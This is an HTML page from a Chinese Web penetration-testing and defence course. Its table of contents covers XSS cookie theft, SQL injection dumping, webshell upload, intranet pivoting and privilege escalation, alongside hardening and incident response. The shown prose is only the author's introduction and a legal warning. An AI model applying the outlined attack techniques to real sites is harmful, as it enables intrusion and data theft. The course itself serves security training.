<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: Web 安全攻防之道</title>
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="https://xuchangwei.com/org-html-themes/src/readtheorg_theme/css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="https://xuchangwei.com/org-html-themes/src/readtheorg_theme/css/readtheorg.css"/>
<link rel="stylesheet" type="text/css" href="https://xuchangwei.com/org-html-themes/src/readtheorg_theme/css/search.css"/>
<script type="text/javascript" src="https://xuchangwei.com/org-html-themes/src/lib/js/jquery.min.js"></script>
<script type="text/javascript" src="https://xuchangwei.com/org-html-themes/src/lib/js/bootstrap.min.js"></script>
<script type="text/javascript" src="https://xuchangwei.com/org-html-themes/src/lib/js/jquery.stickytableheaders.min.js"></script>
<script type="text/javascript" src="https://xuchangwei.com/org-html-themes/src/readtheorg_theme/js/search.js"></script>
<script type="text/javascript" src="https://xuchangwei.com/org-html-themes/src/readtheorg_theme/js/readtheorg.js"></script>
<script>
  window.MathJax = {
    tex: {
      ams: {
        multlineWidth: '85%'
      },
      tags: 'ams',
      tagSide: 'right',
      tagIndent: '.8em'
    },
    chtml: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    svg: {
      scale: 1.0,
      displayAlign: 'center',
      displayIndent: '0em'
    },
    output: {
      font: 'mathjax-modern',
      displayOverflow: 'overflow'
    }
  };
</script>

<script
  id="MathJax-script"
  async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>
</head>
<body>
<div id="content" class="content">
<header>
<h1 class="title">Safe: Web 安全攻防之道</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#h:9159c6fa-faf5-452b-a105-26a5c09a46d2">开篇词  学习 Web 安全，防止你的网站被入侵</a>
<ul>
<li><a href="#未知攻焉知防">未知攻，焉知防</a></li>
<li><a href="#为什么要学-web-安全">为什么要学 Web 安全？</a></li>
<li><a href="#课程设计">课程设计</a></li>
<li><a href="#讲师寄语">讲师寄语</a></li>
</ul>
</li>
<li><a href="#h:4bfb3ea8-8dcc-4fd4-921b-5ceb44e0c450">课前导读  如何学习 Web 渗透技术</a>
<ul>
<li><a href="#web-安全学习路线">Web 安全学习路线</a>
<ul>
<li><a href="#阶段一前端知识学习">阶段一：前端知识学习</a></li>
<li><a href="#阶段二后端知识学习">阶段二：后端知识学习</a></li>
<li><a href="#阶段三漏洞攻防学习">阶段三：漏洞攻防学习</a></li>
</ul>
</li>
<li><a href="#学习技巧">学习技巧</a>
<ul>
<li><a href="#面向岗位学习">面向岗位学习</a></li>
<li><a href="#面向赏金学习">面向赏金学习</a></li>
<li><a href="#面向工具学习">面向工具学习</a></li>
<li><a href="#面向漏洞学习">面向漏洞学习</a></li>
<li><a href="#面向大牛学习">面向大牛学习</a></li>
<li><a href="#关注安全动态">关注安全动态</a></li>
</ul>
</li>
<li><a href="#学习资料清单">学习资料清单</a>
<ul>
<li><a href="#书籍清单">书籍清单</a></li>
<li><a href="#网站推荐">网站推荐</a></li>
<li><a href="#其他资料">其他资料</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:8a0530e8-4023-46bb-8103-6c69777cd4d1">武器库：常用的渗透测试工具</a>
<ul>
<li><a href="#白帽子最喜欢用什么安全工具">白帽子最喜欢用什么安全工具？</a></li>
<li><a href="#burp-suite集成化的-web-应用测试工具">Burp Suite：集成化的 Web 应用测试工具</a></li>
<li><a href="#acunetix-wvs">Acunetix WVS</a></li>
<li><a href="#xrayweb-漏洞扫描器">Xray：Web 漏洞扫描器</a></li>
<li><a href="#goby基于网络空间测绘的漏洞扫描器">Goby：基于网络空间测绘的漏洞扫描器</a></li>
<li><a href="#sqlmapsql-注入检测与利用">SQLMap：SQL 注入检测与利用</a></li>
<li><a href="#nmap网络扫描与主机检测">Nmap：网络扫描与主机检测</a></li>
<li><a href="#postman模拟发包工具">Postman：模拟发包工具</a></li>
<li><a href="#hackbar安全测试插件">HackBar：安全测试插件</a></li>
<li><a href="#ncnetcat网络瑞士军刀">NC（NetCat）：网络瑞士军刀</a></li>
<li><a href="#metasploit渗透测试平台">Metasploit：渗透测试平台</a></li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:beccc5d8-6cff-4a4d-a347-667163b8289e">信息收集：掌握目标的一切信息</a>
<ul>
<li><a href="#信息收集方法">信息收集方法</a></li>
<li><a href="#信息收集实践">信息收集实践</a>
<ul>
<li><a href="#子域名与-ip-收集">子域名与 IP 收集</a></li>
<li><a href="#端口服务探测">端口服务探测</a></li>
<li><a href="#网站指纹识别">网站指纹识别</a></li>
<li><a href="#旁站与-c-段查询">旁站与 C 段查询</a></li>
<li><a href="#waf-探测">WAF 探测</a></li>
<li><a href="#敏感信息收集">敏感信息收集</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:db16c65f-9437-4c31-8954-846790f7cc2f">靶场：搭建漏洞练习环境</a>
<ul>
<li><a href="#安装与使用-docker-容器">安装与使用 Docker 容器</a>
<ul>
<li><a href="#docker-安装">Docker 安装</a></li>
<li><a href="#docker-常用命令">Docker 常用命令</a></li>
</ul>
</li>
<li><a href="#安装-sqli-labs-靶场">安装 sqli-labs 靶场</a></li>
<li><a href="#安装-dvwa-靶场">安装 DVWA 靶场</a></li>
<li><a href="#安装-pikachu-靶场">安装 Pikachu 靶场</a></li>
<li><a href="#ctf-赛题练习">CTF 赛题练习</a></li>
<li><a href="#安装-vulhub-真实漏洞靶场">安装 VulHub 真实漏洞靶场</a></li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:6ed01985-277e-4846-87e1-1d70df16aa14">法律法规：如何合法地进行渗透测试</a>
<ul>
<li><a href="#网络安全法">网络安全法</a></li>
<li><a href="#刑法">刑法</a></li>
<li><a href="#测试与入侵">测试与入侵</a></li>
<li><a href="#袁炜事件">“袁炜事件”</a></li>
<li><a href="#吴永丰事件">“吴永丰事件”</a></li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:74586b32-9e19-46c1-a958-153c6640a62e">XSS：劫持身份的“惯犯”</a>
<ul>
<li><a href="#起源">起源</a></li>
<li><a href="#危害绝不仅仅只是弹框">危害：绝不仅仅只是弹框</a></li>
<li><a href="#xss-漏洞的分类">XSS 漏洞的分类</a>
<ul>
<li><a href="#反射型-xss">反射型 XSS</a></li>
<li><a href="#存储型-xss">存储型 XSS</a></li>
<li><a href="#dom-型-xss">DOM 型 XSS</a></li>
</ul>
</li>
<li><a href="#攻击-xss-漏洞">攻击 XSS 漏洞</a>
<ul>
<li><a href="#窃取-cookie">窃取 Cookie</a></li>
<li><a href="#蠕虫攻击">蠕虫攻击</a></li>
<li><a href="#其他攻击方法">其他攻击方法</a></li>
<li><a href="#beef">BeEF</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:36d2a6d6-a98c-4eef-9507-1ca7bca5ca02">XSS：漏洞的检测与防御</a>
<ul>
<li><a href="#xss-漏洞挖掘">XSS 漏洞挖掘</a>
<ul>
<li><a href="#黑盒测试">黑盒测试</a></li>
<li><a href="#白盒测试">白盒测试</a></li>
</ul>
</li>
<li><a href="#防御-xss-攻击">防御 XSS 攻击</a>
<ul>
<li><a href="#输入检查">输入检查</a></li>
<li><a href="#输出检查">输出检查</a></li>
<li><a href="#防御-dom-xss">防御 DOM XSS</a></li>
<li><a href="#httponly-cookie">Httponly Cookie</a></li>
<li><a href="#content-security-policy">Content Security Policy</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:93de8275-f0ef-4731-bcd4-9b49cab8e05b">SQL 注入：小心数据库被拖走</a>
<ul>
<li><a href="#sql-注入产生的原因">SQL 注入产生的原因</a></li>
<li><a href="#sql-注入的分类">SQL 注入的分类</a>
<ul>
<li><a href="#数字整数型注入">数字/整数型注入</a></li>
<li><a href="#字符型注入">字符型注入</a></li>
</ul>
</li>
<li><a href="#sql-注入测试技术">SQL 注入测试技术</a>
<ul>
<li><a href="#布尔型盲注">布尔型盲注</a></li>
<li><a href="#报错型注入">报错型注入</a></li>
<li><a href="#联合查询注入">联合查询注入</a></li>
<li><a href="#多语句堆叠注入">多语句堆叠注入</a></li>
<li><a href="#基于时间延迟盲注">基于时间延迟盲注</a></li>
<li><a href="#内联嵌套查询注入">内联/嵌套查询注入</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
<li><a href="#二次注入">二次注入</a></li>
<li><a href="#手工注入">手工注入</a></li>
<li><a href="#自动化利用漏洞">自动化利用漏洞</a>
<ul>
<li><a href="#使用-sqlmap-拖库">使用 sqlmap 拖库</a></li>
<li><a href="#利用-tamper-绕过-waf">利用 tamper 绕过 WAF</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#SQL 注入：漏洞的检测与防御">SQL 注入：漏洞的检测与防御</a>
<ul>
<li><a href="#自动化检测-sql-注入">自动化检测 SQL 注入</a>
<ul>
<li><a href="#sast静态应用安全测试">SAST（静态应用安全测试）</a></li>
<li><a href="#dast动态应用安全测试">DAST（动态应用安全测试）</a></li>
<li><a href="#iast交互式应用安全测试">IAST（交互式应用安全测试）</a></li>
<li><a href="#h:b7b8ca26-e4ea-415d-baa4-f6bcd8176dfc">RASP</a></li>
</ul>
</li>
<li><a href="#防御-sql-注入">防御 SQL 注入</a>
<ul>
<li><a href="#白名单">白名单</a></li>
<li><a href="#参数化查询">参数化查询</a></li>
<li><a href="#waf">WAF</a></li>
<li><a href="#rasp">RASP</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:40aecdba-8bed-46b3-8e9f-5c6b403607df">CSRF 漏洞：谁改了我的密码</a>
<ul>
<li><a href="#什么是-csrf-漏洞">什么是 CSRF 漏洞</a></li>
<li><a href="#csrf-分类">CSRF 分类</a></li>
<li><a href="#csrf-的攻击手法">CSRF 的攻击手法</a></li>
<li><a href="#json-劫持攻击">JSON 劫持攻击</a>
<ul>
<li><a href="#覆写数据构造器">覆写数据构造器</a></li>
<li><a href="#执行回调函数">执行回调函数</a></li>
</ul>
</li>
<li><a href="#csrf-检测方法">CSRF 检测方法</a></li>
<li><a href="#防御-csrf">防御 CSRF</a>
<ul>
<li><a href="#验证码">验证码</a></li>
<li><a href="#token-验证">Token 验证</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:fb629733-e08e-4fdd-ba62-4ceb29a96473">SSRF 漏洞：外网隔离就绝对安全了吗</a>
<ul>
<li><a href="#什么是-ssrf-漏洞">什么是 SSRF 漏洞？</a></li>
<li><a href="#ssrf-的危害">SSRF 的危害</a></li>
<li><a href="#常见的利用与限制绕过方法">常见的利用与限制绕过方法</a>
<ul>
<li><a href="#利用支持的-url-schema-发起请求伪造">1.利用支持的 URL Schema 发起请求伪造</a></li>
<li><a href="#读取本地文件">2.读取本地文件</a></li>
<li><a href="#攻击内网应用漏洞">3.攻击内网应用漏洞</a></li>
<li><a href="#绕过-ip-限制">4.绕过 IP 限制</a></li>
<li><a href="#绕过-url-解析限制">5.绕过 URL 解析限制</a></li>
</ul>
</li>
<li><a href="#ssrf-漏洞挖掘思路">SSRF 漏洞挖掘思路</a>
<ul>
<li><a href="#如何判断是否存在-ssrf-漏洞">1.如何判断是否存在 SSRF 漏洞</a></li>
<li><a href="#容易出现-ssrf-漏洞的业务场景">2.容易出现 SSRF 漏洞的业务场景</a></li>
</ul>
</li>
<li><a href="#检测-ssrf-的通用方法和工具">检测 SSRF 的通用方法和工具</a>
<ul>
<li><a href="#方法burp-collaborator">1.方法：Burp Collaborator</a></li>
<li><a href="#工具ssrfmap">2.工具：SSRFmap</a></li>
</ul>
</li>
<li><a href="#ssrf-漏洞防御">SSRF 漏洞防御</a></li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:a67a4345-e5f9-4b40-8cc2-5137f170aa56">XXE 漏洞：XML 解析器的坑</a>
<ul>
<li><a href="#xxexml-外部实体注入">XXE：XML 外部实体注入</a></li>
<li><a href="#那么什么是-xml">那么，什么是 XML？</a>
<ul>
<li><a href="#xml-文档结构">1.XML 文档结构</a></li>
<li><a href="#dtd-实体声明">2.DTD 实体声明</a></li>
</ul>
</li>
<li><a href="#危害xxe-的常见攻击手段">危害：XXE 的常见攻击手段</a>
<ul>
<li><a href="#内网攻击">1.内网攻击</a></li>
<li><a href="#读取本地文件">2.读取本地文件</a></li>
<li><a href="#远程执行命令">3.远程执行命令</a></li>
</ul>
</li>
<li><a href="#xxe-漏洞利用工具">XXE 漏洞利用工具</a>
<ul>
<li><a href="#xxeinjector">1.XXEinjector</a></li>
<li><a href="#xxexploiter">2.XXExploiter</a></li>
</ul>
</li>
<li><a href="#xxe-漏洞挖掘">XXE 漏洞挖掘</a>
<ul>
<li><a href="#黑盒测试">1.黑盒测试</a></li>
<li><a href="#白盒审计">2.白盒审计</a></li>
</ul>
</li>
<li><a href="#防御-xxe-漏洞">防御 XXE 漏洞</a></li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#h:92f9eff3-952d-481b-b0f4-153cba29be73">反序列化漏洞：数据转换下的欺骗</a>
<ul>
<li><a href="#序列化与反序列化">序列化与反序列化</a>
<ul>
<li><a href="#序列化示例">1.序列化示例</a></li>
<li><a href="#反序列化示例">2.反序列化示例</a></li>
</ul>
</li>
<li><a href="#漏洞是如何产生的">漏洞是如何产生的？</a></li>
<li><a href="#攻击反序列化漏洞">攻击反序列化漏洞</a>
<ul>
<li><a href="#利用魔术方法">1.利用魔术方法</a></li>
<li><a href="#pop-链构造">2.POP 链构造</a></li>
<li><a href="#phar-文件攻击">3.phar 文件攻击</a></li>
</ul>
</li>
<li><a href="#如何挖掘反序列化漏洞">如何挖掘反序列化漏洞？</a>
<ul>
<li><a href="#代码审计">1.代码审计</a></li>
<li><a href="#rasp-检测">2.RASP 检测</a></li>
<li><a href="#动态黑盒扫描">3.动态黑盒扫描</a></li>
</ul>
</li>
<li><a href="#防御反序列化漏洞">防御反序列化漏洞</a></li>
<li><a href="#扩展其他语言的反序列化">扩展：其他语言的反序列化</a></li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#文件上传漏洞：种植服务器木马的捷径">文件上传漏洞：种植服务器木马的捷径</a>
<ul>
<li><a href="#漏洞成因">漏洞成因</a></li>
<li><a href="#利用漏洞上传-webshell">利用漏洞上传 Webshell</a>
<ul>
<li><a href="#一句话木马">1.一句话木马</a></li>
<li><a href="#webshell-管理工具">2.Webshell 管理工具</a></li>
</ul>
</li>
<li><a href="#绕过上传限制">绕过上传限制</a>
<ul>
<li><a href="#禁用-js">1.禁用 JS</a></li>
<li><a href="#篡改数据包">2.篡改数据包</a></li>
<li><a href="#文件头绕过">3.文件头绕过</a></li>
<li><a href="#截断">4.%00 截断</a></li>
<li><a href="#大小写绕过">5.大小写绕过</a></li>
<li><a href="#后缀别名绕过">6.后缀别名绕过</a></li>
<li><a href="#结合其他漏洞绕过">7.结合其他漏洞绕过</a></li>
</ul>
</li>
<li><a href="#如何发现上传漏洞">如何发现上传漏洞</a>
<ul>
<li><a href="#黑盒扫描">1.黑盒扫描</a></li>
<li><a href="#流量监测">2.流量监测</a></li>
<li><a href="#白盒审计">3.白盒审计</a></li>
</ul>
</li>
<li><a href="#漏洞防御">漏洞防御</a></li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#h:032f9368-3461-4778-85c1-3600c352f2a6">命令与代码注入：常令安全人员半夜应急的漏洞</a>
<ul>
<li><a href="#命令注入漏洞成因">命令注入漏洞成因</a></li>
<li><a href="#漏洞利用实战">漏洞利用实战</a>
<ul>
<li><a href="#命令拼接技巧">1.命令拼接技巧</a></li>
<li><a href="#靶场演练">2.靶场演练</a></li>
<li><a href="#常用的限制绕过技巧">3.常用的限制绕过技巧</a></li>
</ul>
</li>
<li><a href="#挖掘命令注入漏洞">挖掘命令注入漏洞</a>
<ul>
<li><a href="#代码审计">1.代码审计</a></li>
<li><a href="#黑盒扫描">2.黑盒扫描</a></li>
</ul>
</li>
<li><a href="#漏洞防御">漏洞防御</a>
<ul>
<li><a href="#代码层面的漏洞规避">1.代码层面的漏洞规避</a></li>
<li><a href="#命令执行监控与阻断">2.命令执行监控与阻断</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:3c729f69-744e-413e-9f8a-fbb0534cb569">文件包含：不受限地引入文件可能导致网站被入侵</a>
<ul>
<li><a href="#远程文件包含">远程文件包含</a></li>
<li><a href="#本地文件包含">本地文件包含</a></li>
<li><a href="#漏洞利用技巧">漏洞利用技巧</a>
<ul>
<li><a href="#写日志文件">1.写日志文件</a></li>
<li><a href="#写系统环境文件">2.写系统环境文件</a></li>
<li><a href="#写-session-文件">3.写 Session 文件</a></li>
<li><a href="#利用上传文件">4.利用上传文件</a></li>
<li><a href="#利用-php-伪协议">5.利用 PHP 伪协议</a></li>
</ul>
</li>
<li><a href="#挖掘文件包含漏洞">挖掘文件包含漏洞</a>
<ul>
<li><a href="#动态检测思路">1.动态检测思路</a></li>
<li><a href="#静态检测思路">2.静态检测思路</a></li>
<li><a href="#自动化检测与利用工具kadimus">3.自动化检测与利用工具：Kadimus</a></li>
</ul>
</li>
<li><a href="#漏洞防御">漏洞防御</a>
<ul>
<li><a href="#白名单限制">1.白名单限制</a></li>
<li><a href="#设置-open_basedir">2.设置 open_basedir</a></li>
<li><a href="#关闭-allow_url_include">3.关闭 allow_url_include</a></li>
</ul>
</li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#h:ee03d7e7-6ea0-448a-8b65-3fd264bcec64">逻辑漏洞：你的订单信息是如何泄露的</a>
<ul>
<li><a href="#越权漏洞的分类">越权漏洞的分类</a>
<ul>
<li><a href="#水平越权">1.水平越权</a></li>
<li><a href="#垂直越权">2.垂直越权</a></li>
</ul>
</li>
<li><a href="#越权漏洞的检测与利用">越权漏洞的检测与利用</a>
<ul>
<li><a href="#authz">1.Authz</a></li>
<li><a href="#autorize">2.Autorize</a></li>
<li><a href="#auto-repeater">3.Auto Repeater</a></li>
</ul>
</li>
<li><a href="#防御越权漏洞">防御越权漏洞</a></li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#h:7daae3c6-2533-4f78-b0e3-8788960eca92">内网渗透：内网的员工电脑是怎么被外部黑掉的？</a>
<ul>
<li><a href="#内网靶场搭建">内网靶场搭建</a></li>
<li><a href="#内网基础知识">内网基础知识</a>
<ul>
<li><a href="#域">1.域</a></li>
<li><a href="#域控制器">2.域控制器</a></li>
<li><a href="#域关系">3.域关系</a></li>
</ul>
</li>
<li><a href="#内网信息收集">内网信息收集</a>
<ul>
<li><a href="#empire-后渗透利器">1.Empire 后渗透利器</a></li>
<li><a href="#bloodhound-域分析工具">2.BloodHound 域分析工具</a></li>
</ul>
</li>
<li><a href="#通信隧道建设">通信隧道建设</a>
<ul>
<li><a href="#pingtunnel">1.PingTunnel</a></li>
<li><a href="#lcx-端口转发">2.lcx 端口转发</a></li>
<li><a href="#powercat">3.PowerCat</a></li>
<li><a href="#ssh">4.SSH</a></li>
<li><a href="#earthworm">5.EarthWorm</a></li>
</ul>
</li>
<li><a href="#权限提升">权限提升</a>
<ul>
<li><a href="#利用系统软件漏洞提权">1.利用系统/软件漏洞提权</a></li>
<li><a href="#绕过-uac">2.绕过 UAC</a></li>
<li><a href="#令牌窃取">3.令牌窃取</a></li>
</ul>
</li>
<li><a href="#横向移动渗透">横向移动渗透</a>
<ul>
<li><a href="#抓取密码">1.抓取密码</a></li>
<li><a href="#账号密码连接">2.账号密码连接</a></li>
<li><a href="#远程漏洞攻击">3.远程漏洞攻击</a></li>
<li><a href="#跨域攻击">4.跨域攻击</a></li>
</ul>
</li>
<li><a href="#权限维持">权限维持</a>
<ul>
<li><a href="#webshell">1.WebShell</a></li>
<li><a href="#系统后门">2.系统后门</a></li>
<li><a href="#域控维权">3.域控维权</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#构建防线：服务器安全加固">构建防线：服务器安全加固</a>
<ul>
<li><a href="#apache-服务器加固">Apache 服务器加固</a>
<ul>
<li><a href="#删除默认页面">1.删除默认页面</a></li>
<li><a href="#关闭目录浏览功能">2.关闭目录浏览功能</a></li>
<li><a href="#开启访问日志">3.开启访问日志</a></li>
<li><a href="#禁止特定目录解析-php">4.禁止特定目录解析 PHP</a></li>
<li><a href="#不以-root-启动-apache">5.不以 Root 启动 Apache</a></li>
<li><a href="#禁止访问外部文件">6.禁止访问外部文件</a></li>
<li><a href="#错误页面重定向">7.错误页面重定向</a></li>
</ul>
</li>
<li><a href="#nginx-服务器加固">Nginx 服务器加固</a>
<ul>
<li><a href="#关闭目录浏览">1.关闭目录浏览</a></li>
<li><a href="#开启访问日志-1">2.开启访问日志</a></li>
<li><a href="#限制特定目录解析-php">3.限制特定目录解析 PHP</a></li>
<li><a href="#删除默认页面-1">4.删除默认页面</a></li>
</ul>
</li>
<li><a href="#php-安全配置">PHP 安全配置</a>
<ul>
<li><a href="#限制脚本访问权限">1.限制脚本访问权限</a></li>
<li><a href="#禁止危险函数">2.禁止危险函数</a></li>
<li><a href="#关闭错误消息显示">3.关闭错误消息显示</a></li>
<li><a href="#禁止访问远程文件">4.禁止访问远程文件</a></li>
</ul>
</li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#h:dd24e325-1dc8-4a20-acd4-3d96def36ea7">入侵排查：阻断与追踪黑客</a>
<ul>
<li><a href="#网站入侵检测">网站入侵检测</a></li>
<li><a href="#应急处置流程">应急处置流程</a>
<ul>
<li><a href="#关闭外网进行排查">1.关闭外网进行排查</a></li>
<li><a href="#webshell-检测分析与清除">2.Webshell 检测、分析与清除</a></li>
<li><a href="#web-日志分析">3.Web 日志分析</a></li>
<li><a href="#系统后门与日志排查">4. 系统后门与日志排查</a></li>
<li><a href="#漏洞分析复现与修复">5. 漏洞分析、复现与修复</a></li>
<li><a href="#安全加固后上线">6. 安全加固后上线</a></li>
</ul>
</li>
<li><a href="#常用的排查工具">常用的排查工具</a>
<ul>
<li><a href="#河马">1.河马</a></li>
<li><a href="#牧云cloudwalker">2.牧云（CloudWalker）</a></li>
<li><a href="#php-malware-finder">3.PHP Malware Finder</a></li>
<li><a href="#d-盾">4.D 盾</a></li>
<li><a href="#lorgapache-日志分析工具">5.Lorg：Apache 日志分析工具</a></li>
</ul>
</li>
<li><a href="#实例演示">实例演示</a>
<ul>
<li><a href="#关闭外网进行排查-1">1.关闭外网进行排查</a></li>
<li><a href="#webshell-检测">2.Webshell 检测</a></li>
<li><a href="#web-日志分析-1">3.Web 日志分析</a></li>
<li><a href="#漏洞定位与复现">4.漏洞定位与复现</a></li>
<li><a href="#清除与加固">5.清除与加固</a></li>
</ul>
</li>
<li><a href="#小结">小结</a></li>
</ul>
</li>
<li><a href="#h:36966594-9bb1-41d7-b90a-9e8f838615f7">研发安全：从 SDL 到 DevSecOps</a>
<ul>
<li><a href="#什么是-sdl">什么是 SDL？</a></li>
<li><a href="#什么是-devsecops">什么是 DevSecOps？</a>
<ul>
<li><a href="#devops">1. DevOps</a></li>
<li><a href="#devops-与其他开发模式的不同">2. DevOps 与其他开发模式的不同</a></li>
<li><a href="#devsecops-强调安全">3.DevSecOps 强调安全</a></li>
</ul>
</li>
<li><a href="#sdl-与-devsecops-的对比">SDL 与 DevSecOps 的对比</a></li>
<li><a href="#devsecops-工具链及其建设实践">DevSecOps 工具链及其建设实践</a>
<ul>
<li><a href="#计划plan">1.计划（Plan）</a></li>
<li><a href="#创建create">2.创建（Create）</a></li>
<li><a href="#验证verify">3.验证（Verify）</a></li>
<li><a href="#预发布preprod">4.预发布（Preprod）</a></li>
<li><a href="#发布release">5.发布（Release）</a></li>
<li><a href="#预防prevent">6.预防（Prevent）</a></li>
<li><a href="#检测detect">7.检测（Detect）</a></li>
<li><a href="#响应respond">8.响应（Respond）</a></li>
<li><a href="#预测predict">9.预测（Predict）</a></li>
<li><a href="#适应adapt">10.适应（Adapt）</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
</ul>
</li>
<li><a href="#h:26ff2ff7-9a23-47bb-9b2a-4d2465e35e43">结束语   谈谈我的安全观</a>
<ul>
<li><a href="#武德与技艺">武德与技艺</a></li>
<li><a href="#个人与行业">个人与行业</a></li>
<li><a href="#局部与整体">局部与整体</a></li>
<li><a href="#安全与业务">安全与业务</a></li>
<li><a href="#技术与运营">技术与运营</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../../../index.html">Safe</a></li>
</ul>

<p>
<b>40828字</b>
</p>
<section id="outline-container-h:9159c6fa-faf5-452b-a105-26a5c09a46d2" class="outline-2">
<h2 id="h:9159c6fa-faf5-452b-a105-26a5c09a46d2">开篇词  学习 Web 安全，防止你的网站被入侵</h2>
<div class="outline-text-2" id="text-h:9159c6fa-faf5-452b-a105-26a5c09a46d2">
<p>
你好，我是赢少良。我在安全行业从业 10 年，目前就职于某世界 500强知名企
业，主要从事安全应急、渗透测试等信息安全相关的工作。我曾多次获得“微软
全球最具价值安全研究员”，也曾获得国内外各大知名厂商的漏洞致谢，包括
Mcicrosoft、Google、Apple、Adobe、阿里、百度等。
</p>

<p>
早年，我在《黑客防线》《黑客手册》等知名技术杂志上发表文章，并常年混迹
于国内各大SRC 平台，以及 HackerOne 等国外知名的漏洞奖励平台，擅长领域
涉及Web、Android、Windows、macOS/iOS 等多个安全方向。
</p>

<p>
拉勾教育在做的事情，让我有幸触碰一种新的内容分享方式，来和你系统化聊一聊
Web 安全。
</p>
</div>
<div id="outline-container-未知攻焉知防" class="outline-3">
<h3 id="未知攻焉知防">未知攻，焉知防</h3>
<div class="outline-text-3" id="text-未知攻焉知防">
<p>
高中时，某日在一手机论坛上闲逛，碰巧有两个网站的站长因为矛盾产生了一场
骂战。最后其中一位站长把另一站长的网站给黑了，还挂了“黑页”（黑客篡改
掉的网站页面），上面写着“Hacked By xxx”的字样。当时对那位站长深感敬
仰，感觉真酷。现在回想起来，难免自嘲那会儿太年轻，没见过世面。
</p>

<p>
这里声明下： <b>非法入侵他人网站属于违法行为，要负法律责任的</b> 。
</p>

<p>
早些年，国家网络安全法律还不健全，很多网站的安全性也非常欠缺；很多网站
被黑掉，被黑客们美其名曰“友情检测”；各种黑页满天飞，甚至还有专门的网
站来统计和排名。有人为了上榜，就拼命地乱黑网站，挂黑页炫耀，甚至留QQ
号收徒，然后截图提交到排行榜网站。
</p>

<p>
写开篇词的时候，我还去搜了下，找到了一张比较有挑衅意味的黑页：
</p>


<figure id="org7fd01da">
<img src="./images/Ciqc1F_ZrguAajCFAAFOa2Rk5Uk706.png" alt="Ciqc1F_ZrguAajCFAAFOa2Rk5Uk706.png" width="80%">

</figure>

<p>
图 1：黑页展示
</p>

<p>
一些小网站被黑，可能影响不大。但如果是大公司的网站被黑，随便一起都是一
次严重的公关事件，甚至股价腰斩。
</p>

<p>
2017 年 9 月，美国三大信用评级机构之一的 Equifax公司服务器被黑，数据库
被盗，导致近一半的美国人隐私信息遭泄露，包括姓名、生日、电话、住址、信
用卡号、驾驶证号等。被曝光当天，Equifax股价暴跌，花了近 2 年的时间才恢
复原先的价格。
</p>


<figure id="orgb11c6ff">
<img src="./images/Cip5yF_a9VmAT09FAANFJ_1ui88407.png" alt="Cip5yF_a9VmAT09FAANFJ_1ui88407.png" width="80%">

</figure>

<p>
图 2：艾可菲公司股票
</p>

<p>
可能你觉得其他公司和你没有关系。那如果是你的网站被黑，或者是你就职公司
的网站被黑，你会做何感想呢？
</p>

<p>
我们当然不希望发生这种事情。 <b>所以学习相关的网络渗透技术，正是为了更好
地防御</b> 。如果你不知道黑客是如何攻击的，自然也就无从做出相应的防御对策。
这就跟警察抓罪犯一样，如果警察不具备犯罪相应的知识，又如何洞察他人的犯
罪行为呢？“未知攻，焉知防”，正是此理。
</p>
</div>
</div>
<div id="outline-container-为什么要学-web-安全" class="outline-3">
<h3 id="为什么要学-web-安全">为什么要学 Web 安全？</h3>
<div class="outline-text-3" id="text-为什么要学-web-安全">
<p>
随着时代的发展，如今无论是国家还是企业，都十分重视网络安全，各种相关的
岗位也随之出现。在拉勾网上搜“Web安全”就能找到相关的岗位。
</p>


<figure id="orgc30d614">
<img src="./images/Cip5yF_ZrimAa4buAAGDyX9tPm4751.png" alt="Cip5yF_ZrimAa4buAAGDyX9tPm4751.png" width="80%">

</figure>

<p>
图 3：招聘信息来源拉勾网
</p>

<p>
根据 HackerOne 的报告数据（下图），71％的安全问题都出现在网站上，其次
是一些 API 接口，这些接口可能是 Web的，也有可能是二进制软件的；再往下
就是 iOS 与 Android 应用了。
</p>


<figure id="org6e400c5">
<img src="./images/Cip5yF_a9iqAG5wmAAEiks_na48436.png" alt="Cip5yF_a9iqAG5wmAAEiks_na48436.png" width="80%">

</figure>

<p>
图 4：HackerOne 的报告数据
</p>

<p>
可以说，网站安全攻防，也就是我们俗称的 Web 安全，占比通常达到了 80％
以上。  <b>Web安全是最受外部黑客关注的目标，也是企业应该重点防御的对象</b>
。
</p>


<figure id="org19e6f10">
<img src="./images/Ciqc1F_ZuTOAAN8RAAUzN1R2YTo837.png" alt="Ciqc1F_ZuTOAAN8RAAUzN1R2YTo837.png" width="80%">

